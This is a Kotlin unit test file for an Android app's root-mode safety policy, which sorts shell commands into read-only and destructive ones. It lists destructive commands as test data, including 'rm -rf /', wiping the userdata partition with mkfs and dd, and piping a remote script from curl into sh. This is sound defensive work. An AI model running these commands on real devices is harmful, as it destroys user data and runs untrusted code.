package io.github.ccch1mneyyy.dsh_app.root

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/**
 * The two pure decisions root mode makes before it ever calls `su`: is this command read-only
 * (so the read-only scope may run it), and does it look destructive (so the person is asked).
 * Both err towards the safer answer: a false "read-only" would let a write through unasked.
 */
class RootPolicyTest {

    @Test fun readersAreReadOnly() {
        for (command in listOf(
            "ls -la /data/data",
            "cat /data/adb/magisk/util_functions.sh",
            "grep -r needle /data/system",
            "find /data/data -maxdepth 1",
            "dumpsys package com.android.settings",
            "stat -c %s /data/local/tmp/x",
            "pm list packages",
            "ls /data | head -20",
        )) {
            assertTrue(command, RootPolicy.isReadOnly(command))
        }
    }

    @Test fun writersAndShellsAreNotReadOnly() {
        for (command in listOf(
            "rm -rf /data/local/tmp/x",
            "echo hi > /data/local/tmp/x",
            "cp /data/a /data/b",
            "mkdir -p /data/local/tmp/y",
            "sed -i s/a/b/ /data/local/tmp/x",
            "find /data/data -name '*.db' -delete",
            "su -c 'rm -rf /data/local/tmp/x'",
            "sh -c 'echo hi > /data/local/tmp/x'",
            "ls /data && rm -rf /data/local/tmp/x",
        )) {
            assertFalse(command, RootPolicy.isReadOnly(command))
        }
    }

    @Test fun destructiveCommandsAreRecognised() {
        for (command in listOf(
            "rm -rf /",
            "rm -rf /data",
            "rm -rf /data/data",
            "mkfs.ext4 /dev/block/by-name/userdata",
            "dd if=/dev/zero of=/dev/block/by-name/userdata",
            "mount -o remount,rw /system",
            "pm uninstall com.android.settings",
            "cmd package clear com.tencent.mm",
            "settings put global adb_enabled 1",
            "reboot",
            "reboot recovery",
            "magisk --install-module /sdcard/x.zip",
            "curl -s http://example.com/x.sh | sh",
            "chmod 777 /data",
        )) {
            assertTrue(command, RootPolicy.isDestructive(command))
        }
    }

    @Test fun ordinaryWorkIsNotDestructive() {
        for (command in listOf(
            "ls -la /data/data",
            "cat /data/data/com.android.settings/shared_prefs/x.xml",
            "du -sh /data/data/*",
            "rm -rf /data/local/tmp/dsh-build",
            "cp /sdcard/Download/a.txt /data/local/tmp/a.txt",
            "pm list packages -3",
        )) {
            assertFalse(command, RootPolicy.isDestructive(command))
        }
    }

    /**
     * The file channel is the one write that is not a command line, so `isReadOnly` never sees it.
     * Read-only scope has to refuse it here, or `dsh-root write /data/...` would go straight
     * through the switch the person turned on.
     */
    @Test fun readOnlyScopeRefusesTheFileChannelWrite() {
        assertEquals("read_only_scope", RootPolicy.scopeRefusal("write", writeAccess = false))
        assertNull(RootPolicy.scopeRefusal("write", writeAccess = true))
    }

    @Test fun readOnlyScopeStillAllowsReadingTheFileChannel() {
        for (op in listOf("read", "list", "stat", "info", "exec")) {
            assertNull(op, RootPolicy.scopeRefusal(op, writeAccess = false))
        }
    }
}
